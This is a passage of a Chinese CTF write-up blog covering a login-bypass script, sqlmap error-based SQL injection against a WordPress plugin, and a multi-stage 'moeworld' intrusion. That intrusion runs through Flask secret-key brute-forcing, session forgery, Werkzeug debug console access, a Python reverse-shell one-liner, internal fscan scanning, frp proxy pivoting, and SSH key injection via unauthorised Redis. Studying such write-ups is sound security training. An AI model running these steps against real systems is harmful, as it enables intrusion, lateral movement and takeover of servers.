                self.end_headers()
                self.wfile.write(b&quot;404 Not Found&quot;)
        except Exception as e:
            print(e)
            self.send_response(500)
            self.end_headers()
            self.wfile.write(b&quot;500 Internal Server Error&quot;)

if __name__ == &quot;__main__&quot;:
    server = http.server.HTTPServer((&quot;&quot;, 9999), MyHandler)
    server.serve_forever()
</code></pre>
<pre><code>assert users[&quot;admin&quot;] == &quot;admin&quot;
users中存在用户名“admin”密码也为“admin”，表面上看需要传入的参数也为admin/admin。

</code></pre>
<p><img src="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230907210222817.png" alt="image-20230907210222817"></p>
<p>继续分析源码可以发现eval()语句将base64.b64encode覆写为base64.b64decode</p>
<pre><code class="python">def gethash(*items):
    c = 0
    for item in items:
        if item is None:
            continue
        c ^= int.from_bytes(hashlib.md5(f&quot;{salt}[{item}]{salt}&quot;.encode()).digest(), &quot;big&quot;) # it looks so complex! but is it safe enough?
    return hex(c)[2:]
#当传入的参数items为2个时该函数等价于求两个参数的异或值并返回，所以当两个参数相等时不管该参数为何值，返回值都为0
#而传入参数有两个过滤，username不能等于“admin”，且username不能等于password，而拿到flag需要hashed值为0，怎么才能做到呢？
</code></pre>
<p><strong>而传入参数有两个过滤，username不能等于“admin”，且username不能等于password，而拿到flag需要hashed值为0，怎么才能做到呢？</strong></p>
<p>接下来编写脚本即可把构造的json数据base64编码五次</p>
<pre><code class="python">import requests
import base64

url = &quot;http://localhost:64817/login&quot;
username = &quot;\&quot;1\&quot;&quot;
password = &quot;1&quot;
jsondata = &quot;{\&quot;username\&quot;:&quot;+f&quot;{username}&quot;+&quot;,\&quot;password\&quot;:&quot;+f&quot;{password}&quot;+&quot;}&quot;
print(f&quot;{jsondata = }&quot;)
for _ in range(5):
    jsondata = base64.b64encode(str(jsondata).encode()).decode()
data = &quot;{\&quot;params\&quot;:\&quot;&quot;+f&quot;{jsondata}\&quot;&quot;+&quot;}&quot;
print(f&quot;{data = }&quot;)
req = requests.post(url=url,data=data).text
print(f&quot;{req = }&quot;)
</code></pre>
<h1 id="出去旅游的心海"><a href="#出去旅游的心海" class="headerlink" title="出去旅游的心海"></a>出去旅游的心海</h1><p>CHALLENGE: 出去旅游的心海<br>DESCRIPTION: 欢迎来到心海新建的博客！正值假期期间，她抓紧时间出去旅游放松一下，看看她最近都在研究什么？<br><a href="http://101.42.178.83:7770/">http://101.42.178.83:7770/</a></p>
<p>查看源码页面可发现一个php文件链接</p>
<p><img src="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230922215913893.png" alt="image-20230922215913893"></p>
<pre><code class="php">&lt;?php
/*
Plugin Name: Visitor auto recorder
Description: Automatically record visitor&#39;s identification, still in development, do not use in industry environment!
Author: KoKoMi
  Still in development! :)
*/

// 不许偷看！这些代码我还在调试呢！
highlight_file(__FILE__);

// 加载数据库配置，暂时用硬编码绝对路径
require_once(&#39;/var/www/html/wordpress/&#39; . &#39;wp-config.php&#39;);

$db_user = DB_USER; // 数据库用户名
$db_password = DB_PASSWORD; // 数据库密码
$db_name = DB_NAME; // 数据库名称
$db_host = DB_HOST; // 数据库主机

// 我记得可以用wp提供的global $wpdb来操作数据库，等旅游回来再研究一下
// 这些是临时的代码

$ip = $_POST[&#39;ip&#39;];
$user_agent = $_POST[&#39;user_agent&#39;];
$time = stripslashes($_POST[&#39;time&#39;]);

$mysqli = new mysqli($db_host, $db_user, $db_password, $db_name);

// 检查连接是否成功
if ($mysqli-&gt;connect_errno) {
    echo &#39;数据库连接失败: &#39; . $mysqli-&gt;connect_error;
    exit();
}

$query = &quot;INSERT INTO visitor_records (ip, user_agent, time) VALUES (&#39;$ip&#39;, &#39;$user_agent&#39;, $time)&quot;;

// 执行插入
$result = mysqli_query($mysqli, $query);

// 检查插入是否成功
if ($result) {
    echo &#39;数据插入成功&#39;;
} else {
    echo &#39;数据插入失败: &#39; . mysqli_error($mysqli);
}

// 关闭数据库连接
mysqli_close($mysqli);

//gpt真好用
</code></pre>
<p>根据测试发现time存在报错注入</p>
<p><img src="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230922220234166.png" alt="image-20230922220234166"></p>
<p>sqlmap一把梭</p>
<pre><code class="bash">python3 sqlmap.py  -u &quot;http://101.42.178.83:7770/wordpress/wp-content/plugins/visitor-logging/logger.php&quot;  --data &quot;time=1&quot;  --dbs  --batch

python3 sqlmap.py  -u &quot;http://101.42.178.83:7770/wordpress/wp-content/plugins/visitor-logging/logger.php&quot;  --data &quot;time=1&quot;  -D wordpress --tables --batch

python3 sqlmap.py  -u &quot;http://101.42.178.83:7770/wordpress/wp-content/plugins/visitor-logging/logger.php&quot;  --data &quot;time=1&quot;  -D wordpress  -T secret_of_kokomi --columns --batch

</code></pre>
<p><img src="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230922222050154.png" alt="image-20230922222050154"></p>
<h1 id="moeworld"><a href="#moeworld" class="headerlink" title="moeworld"></a>moeworld</h1><p>CHALLENGE: moeworld<br>DESCRIPTION: 你已经学会了1+1&#x3D;2，接下来尝试真实的渗透吧~<br>解压密码为“出去旅游的心海”的flag</p>
<p>下载附件解压得到如下文件</p>
<pre><code>本题你将扮演**红队**的身份，以该外网ip入手，并进行内网渗透，最终获取到完整的flag

题目环境：http://47.115.201.35:8000/

在本次公共环境中渗透测试中，希望你**不要做与获取flag无关的行为，不要删除或篡改flag，不要破坏题目环境，不要泄露题目环境！**

**注册时请不要使用你常用的密码，本环境密码在后台以明文形式存储**

hint.zip 密码请在拿到外网靶机后访问根目录下的**readme**，完成条件后获取

环境出现问题，请第一时间联系出题人**xlccccc**

对题目有疑问，也可随时询问出题人
</code></pre>
<p>根据题目来说看来需要内网遨游了</p>
<p><img src="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230922222659454.png" alt="image-20230922222659454"></p>
<p>一个python搭建的网页这是该网站源码</p>
<p><strong>app.py</strong></p>
<pre><code class="python">from curses import flash
from flask import Flask, request, render_template, redirect, session, url_for, flash
import os
import dataSql
import datetime
from hashlib import md5

app = Flask(__name__)

app.template_folder = os.path.join(&quot;static/templates&quot;)
app.static_folder = os.path.join(&quot;static&quot;)

app.secret_key = &quot;This-random-secretKey-you-can&#39;t-get&quot; + os.urandom(2).hex()


@app.route(&#39;/login&#39;, methods=[&#39;GET&#39;, &#39;POST&#39;])
def login():
    if &#39;user&#39; not in session:
        if request.method == &#39;GET&#39;:
            return render_template(&#39;login.html&#39;)
        username = request.form[&#39;user&#39;]
        password = request.form[&#39;password&#39;]
        if dataSql.canLogin(username, password):
            session[&#39;user&#39;] = username
            session[&#39;power&#39;] = dataSql.getPower(username)
            return redirect(&#39;/index&#39;)
        else:
            flash(&quot;username or password incorrect&quot;)
            return redirect(&#39;login&#39;)
    else:
        return &#39;&#39;&#39;&lt;script&gt;alert(&quot;You have already logged in.&quot;);window.location.href=&quot;/index&quot;;&lt;/script&gt;&#39;&#39;&#39;

# change the password


@app.route(&#39;/change&#39;, methods=[&#39;GET&#39;, &#39;POST&#39;])
def foundpwd():
    if request.method == &#39;GET&#39;:
        return render_template(&#39;changepwd.html&#39;)
    username = request.form[&#39;user&#39;]
    oldPassword = request.form[&#39;oldPassword&#39;]
    newPassword = request.form[&#39;newPassword&#39;]
    a = dataSql.changePassword(username, oldPassword, newPassword)
    if a == True:
        return &#39;&#39;&#39;
    change successfully
    &lt;br&gt;
    &lt;a href=&#39;login&#39;&gt;login now&lt;/a&gt;
    &#39;&#39;&#39;
    else:
        flash(a)
        return redirect(&#39;change&#39;)


# register for enter the message board
@app.route(&#39;/register&#39;, methods=[&#39;GET&#39;, &#39;POST&#39;])
def register():
    if request.method == &#39;GET&#39;:
        return render_template(&#39;register.html&#39;)
    id = dataSql.usersName()
    username = request.form[&#39;user&#39;]
    password = request.form[&#39;password&#39;]
    power = &#39;guest&#39;
    if dataSql.register(id, username, password, power):
        return &#39;&#39;&#39;
    register successfully
    &lt;br&gt;
    &lt;a href=&#39;login&#39;&gt;login now&lt;/a&gt;
    &#39;&#39;&#39;
    else:
        flash(&#39;username already exists&#39;)
        return redirect(&#39;register&#39;)


@app.route(&#39;/logout&#39;, methods=[&#39;GET&#39;])
def logout():
    if &#39;user&#39; in session:
        session.pop(&#39;user&#39;)
        return redirect(&#39;/login&#39;)
    else:
        return &#39;&#39;&#39;
    you are not logged in
    &lt;br&gt;
    &lt;a href=&#39;login&#39;&gt;login now&lt;/a&gt;
    &#39;&#39;&#39;


@app.route(&#39;/&#39;, methods=[&#39;GET&#39;, &#39;POST&#39;])
@app.route(&#39;/index&#39;, methods=[&#39;GET&#39;, &#39;POST&#39;])
def index():
    if &#39;user&#39; in session:
        if request.method == &#39;GET&#39;:
            msg = getMsgList()
            if session[&#39;power&#39;] == &#39;guest&#39;:
                for i in msg:
                    # remove the message send by other user on private condition
                    if i[3] == &quot;1&quot; and session[&#39;user&#39;] != i[0]:
                        msg.remove(i)
            return render_template(&#39;index.html&#39;, username=session[&#39;user&#39;], msg=msg)
        else:
            message = request.form[&#39;message&#39;]
            username = session[&#39;user&#39;]
            nowtime = str(datetime.datetime.now())
            if &#39;private&#39; in request.form:
                private = 1
            else:
                private = 0
            if message == &#39;&#39;:
                return &#39;&#39;&#39;&lt;script&gt;alert(&quot;invalid input&quot;);window.location.href=&quot;/index&quot;;&lt;/script&gt;&#39;&#39;&#39;
            dataSql.uploadMessage(username, message, nowtime, private)
            return &#39;&#39;&#39;&lt;script&gt;alert(&quot;upload successfully&quot;);window.location.href=&quot;/index&quot;;&lt;/script&gt;&#39;&#39;&#39;
    else:
        return redirect(&#39;/login&#39;)


@app.route(&#39;/delete&#39;, methods=[&#39;GET&#39;])
def delete():
    if &#39;user&#39; in session:
        psg = request.args.get(&#39;psg&#39;)
        msg = list(dataSql.showMessage())
        for i in range(len(msg)):
            h1 = md5()
            h1.update(str(msg[i][2]).encode(encoding=&#39;utf-8&#39;))
            h2 = h1.hexdigest()
            if (msg[i][0] == session[&#39;user&#39;] or session[&#39;power&#39;] == &#39;root&#39;) and h2 == psg:
                dataSql.deleteMessage(msg[i][0], msg[i][2])
                return redirect(&#39;/index&#39;)
        return &#39;&#39;&#39;&lt;script&gt;alert(&quot;Permission denied&quot;);window.location.href=&quot;/index&quot;;&lt;/script&gt;&#39;&#39;&#39;
    else:
        return &#39;&#39;&#39;&lt;script&gt;alert(&quot;login first&quot;);window.location.href=&quot;/index&quot;;&lt;/script&gt;&#39;&#39;&#39;


@app.route(&#39;/index/api/getMessage&#39;, methods=[&#39;GET&#39;])
def getMessage():
    username = request.args.get(&#39;username&#39;)
    password = request.args.get(&#39;password&#39;)
    if(username == None or password == None):
        return {&#39;status&#39;: &#39;failed&#39;, &#39;message&#39;: &#39;invalid input&#39;}
    elif(not dataSql.canLogin(username, password)):
        return {&#39;status&#39;: &#39;failed&#39;, &#39;message&#39;: &#39;username or password incorrect&#39;}
    elif(dataSql.canLogin(username, password)):
        msg = getMsgList()
        if dataSql.getPower(username) == &#39;guest&#39;:
            for i in msg:
                # remove the message send by other user on private condition
                if i[3] == &quot;1&quot; and username != i[0]:
                    msg.remove(i)
        return msg


def getMsgList():
    msg = list(dataSql.showMessage())
    for i in range(len(msg)):
        h1 = md5()
        h1.update(str(msg[i][2]).encode(encoding=&#39;utf-8&#39;))
        msg[i] += tuple([h1.hexdigest()])
    return msg


if __name__ == &#39;__main__&#39;:
    app.run(host = &quot;0.0.0.0&quot;, debug=True, port=8000)
</code></pre>
<p><strong>datasql.py</strong></p>
<pre><code class="python">import pymysql
import time
import getPIN

pin = getPIN.get_pin()

class Database:
    def __init__(self, max_retries=3):
        self.max_retries = max_retries
        self.db = None

    def __enter__(self):
        self.db = self.connect_to_database()
        return self.db, self.db.cursor()

    def __exit__(self, exc_type, exc_val, exc_tb):
        if self.db and self.db.open:
            self.db.close()

    def connect_to_database(self):
        retries = 0
        while retries &lt; self.max_retries:
            try:
                db = pymysql.connect(
                    host=&quot;mysql&quot;,  # 数据库地址
                    port=3306,  # 数据库端口
                    user=&quot;root&quot;,  # 数据库用户名
                    passwd=&quot;The_P0sswOrD_Y0u_Nev3r_Kn0w&quot;,  # 数据库密码
                    database=&quot;messageboard&quot;,  # 数据库名
                    charset=&#39;utf8&#39;
                )
                return db
            except pymysql.Error as e:
                retries += 1
                print(f&quot;Connection attempt {retries} failed. Retrying in 5 seconds...&quot;)
                time.sleep(5)
        raise Exception(&quot;Failed to connect to the database after maximum retries.&quot;)

def canLogin(username,password):
    with Database() as (db, cursor):
        sql = &#39;select password from users where username=%s&#39;
        cursor.execute(sql, username)
        res = cursor.fetchall()
        if res:
            if res[0][0] == password:
                return True
        return False

def register(id,username,password,power):
    with Database() as (db, cursor):
        sql = &#39;select username from users where username=%s&#39;
        cursor.execute(sql, username)
        res = cursor.fetchall()
        if res:
            return False
        else:
            sql = &#39;insert into users (id,username,password,power) values (%s,%s,%s,%s)&#39;
            cursor.execute(sql, (id,username,password,power))
            db.commit()
            return True

def changePassword(username,oldPassword,newPassword):
    with Database() as (db, cursor):
        sql = &#39;select password from users where username=%s&#39;
        cursor.execute(sql, username)
        res = cursor.fetchall()
        if res:
            if oldPassword == res[0][0]:
                sql = &#39;update users set password=%s where username=%s&#39;
                cursor.execute(sql, (newPassword,username))
                db.commit()
                return True
            else:
                return &quot;wrong password&quot;
        else:
            return &quot;username doesn&#39;t exist.&quot;

def uploadMessage(username,message,nowtime,private):
    with Database() as (db, cursor):
        sql = &#39;insert into message (username,data,time,private) values (%s,%s,%s,%s)&#39;
        cursor.execute(sql, (username,message,nowtime,private))
        db.commit()
        return True

def showMessage():
    with Database() as (db, cursor):
        sql = &#39;select * from message&#39;
        cursor.execute(sql)
        res = cursor.fetchall()
        res = [tuple([str(elem).replace(&#39;128-243-397&#39;, pin) for elem in i]) for i in res]
        return res

def usersName():
    with Database() as (db, cursor):
        sql = &#39;select * from users&#39;
        cursor.execute(sql)
        res = cursor.fetchall()
        return len(res)

def getPower(username):
    with Database() as (db, cursor):
        sql = &#39;select power from users where username=%s&#39;
        cursor.execute(sql, username)
        res = cursor.fetchall()
        return res[0][0]

def deleteMessage(username,pubTime):
    with Database() as (db, cursor):
        sql = &#39;delete from message where username=%s and time=%s&#39;
        cursor.execute(sql,(username,pubTime))
        db.commit()
        return True
</code></pre>
<p><strong>getPIN.py</strong></p>
<pre><code class="python">import hashlib
from itertools import chain
import uuid
def get_pin():
    probably_public_bits = [
        &#39;root&#39;# username  /proc/self/environ
        &#39;flask.app&#39;,# modname
        &#39;Flask&#39;,# getattr(app, &#39;__name__&#39;, getattr(app.__class__, &#39;__name__&#39;))
        &#39;/usr/local/lib/python3.9/site-packages/flask/app.py&#39; # getattr(mod, &#39;__file__&#39;, None),
    ]
    uuid1 = str(uuid.getnode())
    linux = b&quot;&quot;

        # machine-id is stable across boots, boot_id is not.
    for filename in &quot;/etc/machine-id&quot;, &quot;/proc/sys/kernel/random/boot_id&quot;:
        try:
            with open(filename, &quot;rb&quot;) as f:
                value = f.readline().strip()
        except OSError:
            continue

        if value:
            linux += value
            break

    # Containers share the same machine id, add some cgroup
    # information. This is used outside containers too but should be
    # relatively stable across boots.
    try:
        with open(&quot;/proc/self/cgroup&quot;, &quot;rb&quot;) as f:
            linux += f.readline().strip().rpartition(b&quot;/&quot;)[2]
    except OSError:
        pass
    linux = linux.decode(&#39;utf-8&#39;)
    private_bits = [
        uuid1,
        linux,
    ]
    h = hashlib.sha1()
    for bit in chain(probably_public_bits, private_bits):
        if not bit:
                continue
        if isinstance(bit, str):
            bit = bit.encode(&quot;utf-8&quot;)
        h.update(bit)
    h.update(b&quot;cookiesalt&quot;)

    cookie_name = f&quot;__wzd{h.hexdigest()[:20]}&quot;

    num = None
    if num is None:
        h.update(b&quot;pinsalt&quot;)
        num = f&quot;{int(h.hexdigest(), 16):09d}&quot;[:9]

    rv=None
    if rv is None:
        for group_size in 5, 4, 3:
            if len(num) % group_size == 0:
                rv = &quot;-&quot;.join(
                    num[x : x + group_size].rjust(group_size, &quot;0&quot;)
                    for x in range(0, len(num), group_size)
                )
                break
        else:
            rv = num

    return rv
</code></pre>
<p>初步分析代码来看需要伪造session会话然后登录管理员账号</p>
<pre><code class="python">app.secret_key = &quot;This-random-secretKey-you-can&#39;t-get&quot; + os.urandom(2).hex()
#关键代码为这一行前面值固定后面不唯一系统随机生成使用python脚本进行暴力枚举
</code></pre>
<p>这个题目和某一个题目非常的相似</p>
<p>[<a href="https://blog.csdn.net/Sapphire037/article/details/126919498">CTF]2022美团CTF WEB WP_os.urandom(2).hex()_Sapphire037的博客-CSDN博客</a></p>
<pre><code class="python">import os
with open(&#39;dict.txt&#39;,&#39;w&#39;) as f:
    for i in range(1,50000):
        a=&quot;This-random-secretKey-you-can&#39;t-get&quot;+os.urandom(2).hex()
        f.write(a)
        f.write(&#39;\n&#39;)
</code></pre>
<p><a href="https://github.com/Paradoxis/Flask-Unsign">Paradoxis&#x2F;Flask-Unsign: Command line tool to fetch, decode, brute-force and craft session cookies of a Flask application by guessing secret keys. (github.com)</a></p>
<p><a href="https://so.csdn.net/so/search?q=flask&spm=1001.2101.3001.7020">flask</a>-unsign工具可以通过字典爆破key</p>
<p>先注册一个用户来获取当前的session</p>
<pre><code>flask-unsign.exe --unsign --cookie &quot;eyJwb3dlciI6Imd1ZXN0IiwidXNlciI6ImFiY2QifQ.ZQ6D4A.1l_objuFHXoApsS1mvzzMsl9k2w&quot; --wordlist .\dict.txt
</code></pre>
<p><img src="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230923142853852.png" alt="image-20230923142853852"></p>
<p>使用flask-session-cookie-manager 工具对获取的key进行加密管理员session</p>
<p><img src="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230923143402274.png" alt="image-20230923143402274"></p>
<p>替换原本session进行登录可见pin泄露</p>
<p><img src="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230923143843592.png" alt="image-20230923143843592"></p>
<p>有了该pin码可访问给出的console接口从而执行任意命令</p>
<p><a href="http://47.115.201.35:8000/console">http://47.115.201.35:8000/console</a></p>
<p><img src="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230923144108060.png" alt="image-20230923144108060"></p>
<p>到现在外网基本拿下了接下来需要内网渗透根据题目提示需要读取根目录的提示文件</p>
<p><img src="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230923144614869.png" alt="image-20230923144614869"></p>
<p>由于该页面操作不是特别友好反弹一个shell在vps上以便后续操作</p>
<p>反弹shell生成网站：<a href="https://www.ddosi.org/shell/">反弹shell命令在线生成器|🔰雨苁🔰 (ddosi.org)</a></p>
<pre><code class="bash">import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;your-ip&quot;,7777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;sh&quot;)
</code></pre>
<p><img src="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230923145032369.png" alt="image-20230923145032369"></p>
<p>根据前面的提示需要对内网进行扫描，使用fscan工具对其它主机进行一个初步的判断</p>
<p><img src="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230923145238948.png" alt="image-20230923145238948"></p>
<p><img src="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230923145730806.png" alt="image-20230923145730806"></p>
<pre><code class="bash">172.20.0.1:888 open
172.20.0.2:22 open
172.20.0.1:22 open
172.20.0.1:21 open
172.20.0.2:6379 open
172.20.0.4:8080 open
172.20.0.1:80 open
172.20.0.3:3306 open
172.20.0.1:3306 open
172.20.0.1:7777 open
</code></pre>
<p>排除网关地址存在mysql和redis根据题目要求可解出第二个压缩包密码</p>
<p><strong>22-3306-6379-8080</strong></p>
<pre><code>当你看到此部分，证明你正确的进行了fscan的操作得到了正确的结果
可以看到，在本内网下还有另外两台服务器
其中一台开启了22(ssh)和6379(redis)端口
另一台开启了3306(mysql)端口
还有一台正是你访问到的留言板服务
接下来，你可能需要搭建代理，从而使你的本机能直接访问到内网的服务器
此处可了解`nps`和`frp`，同样在/app/tools已内置了相应文件
连接代理，推荐`proxychains`
对于mysql服务器，你需要找到其账号密码并成功连接，在数据库中找到flag2
对于redis服务器，你可以学习其相关的渗透技巧，从而获取到redis的权限，并进一步寻找其getshell的方式，最终得到flag3
</code></pre>
<p>到这里就需要搭建代理进行内网渗透了推荐使用frp进行内网穿透VPS搭建好服务端</p>
<p>基本配置如下</p>
<pre><code class="bash">[common]
bind_port = 7000
</code></pre>
<p>接下来是客户端配置</p>
<pre><code class="bash">[common]
server_addr=vps-addr
server_port=7000
[socks5_proxy]
remote_port = 6005
plugin = socks5
[mysql]
type = tcp
local_ip = 172.20.0.3
local_port = 3306
remote_port = 6001
</code></pre>
<p>由于反弹shell不太好写入只能一行一行的进行写入</p>
<p><a href="https://blog.csdn.net/frdevolcqzyxynjds/article/details/106785218">linux之echo写入单行文件，cat写入多行文件_echo写入多行_闭关苦炼内功的博客-CSDN博客</a></p>
<p>链接VPS IP即可密码在网站根目录有给出</p>
<pre><code>passwd=&quot;The_P0sswOrD_Y0u_Nev3r_Kn0w&quot;
</code></pre>
<p><img src="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230923160506306.png" alt="image-20230923160506306"></p>
<p><img src="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230923160820637.png" alt="image-20230923160820637"></p>
<p>接下来需要利用内网的redis进行下一步操作修改frp配置文件连接redis</p>
<p><a href="https://blog.csdn.net/FryhRx/article/details/124087653">redis未授权访问漏洞三种提权方式_redis提权_遇事不决，可问春风、的博客-CSDN博客</a></p>
<pre><code>[redis]
type = tcp
local_ip = 172.20.0.2
local_port = 6379
remote_port = 6002
[ssh]
type = tcp
local_ip = 172.20.0.2
local_port = 22
remote_port = 6003
</code></pre>
<pre><code class="bash">(echo -e &quot;\n\n&quot;; cat id_rsa.pub; echo -e &quot;\n\n&quot;) &gt; key.txt
cat /root/.ssh/key.txt | redis-cli -h vps-ip -p 6002 -x set xxx
</code></pre>
<p><img src="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230923162650038.png" alt="image-20230923162650038"></p>
<p>写入ssh公钥使用vps私钥连接即可同时也需要挂上代理</p>
<p><strong>ssh -i id_rsa  root@vps-ip  -p 6003</strong></p>
<p><img src="https://gitee.com/wodi98k/cnblogsimages/raw/master/img/image-20230923163217649.png" alt="image-20230923163217649"></p>
